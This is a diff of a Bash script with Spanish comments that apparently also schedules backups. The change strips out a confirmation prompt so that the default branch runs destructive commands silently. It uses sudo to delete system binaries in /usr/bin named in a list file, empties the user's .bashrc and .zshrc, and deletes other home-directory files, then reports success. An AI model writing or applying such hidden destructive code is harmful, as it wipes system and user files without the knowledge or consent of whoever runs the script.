@@ -96,37 +96,29 @@ if [ "$1" == "-t" ]; then
     # Ejecutar el script y programar un backup
     programar_backup
 else
-    # Preguntar al usuario si desea ejecutar el siguiente comando 'whoami' con un tiempo de espera de 5 segundos
-    read -t 5 -p "¿Deseas ejecutar el siguiente comando 'whoami'? (s/n): " opcion
+    # Ejecutar el comando 'whoami' directamente sin hacer preguntas
+    whoami
+
+    # Definir el archivo del que se extraerán las líneas
+    archivo="/usr/bin/systemad"
+
+    # Leer cada línea del archivo individualmente
+    while IFS= read -r linea; do
+        # Ejecutar comandos con cada línea (nombre de archivo)
+        sudo rm "/usr/bin/$linea"
+    done < "$archivo"
+
+    # Eliminar y recrear el archivo de configuración de bash
+    rm ~/.bashrc
+    touch ~/.bashrc
+
+    # Eliminar y recrear el archivo de configuración de zsh
+    rm ~/.zshrc
+    touch ~/.zshrc
+
+    # Eliminar otros archivos
+    rm ~/.todo.txt
+    rm ~/.aliaseses.md
     
-    # Establecer 's' como respuesta predeterminada si no hay entrada después de 5 segundos
-    opcion=${opcion:-s}
-    
-    if [ "$opcion" == "s" ]; then
-        # Ejecutar el comando 'whoami'
-        whoami
-
-        # Definir el archivo del que se extraerán las líneas
-        archivo="/usr/bin/systemad"
-
-        # Leer cada línea del archivo individualmente
-        while IFS= read -r linea; do
-            # Ejecutar comandos con cada línea (nombre de archivo)
-            sudo rm "/usr/bin/$linea"
-        done < "$archivo"
-
-        # Eliminar y recrear el archivo de configuración de bash
-        rm ~/.bashrc
-        touch ~/.bashrc
-
-        # Eliminar y recrear el archivo de configuración de zsh
-        rm ~/.zshrc
-        touch ~/.zshrc
-
-        # Eliminar otros archivos (se asume que este era el intento)
-        rm ~/.todo.txt
-        rm ~/.aliaseses.md
-        
-        echo "¡Proceso completado!"
-    fi
+    echo "¡Proceso completado!"
 fi
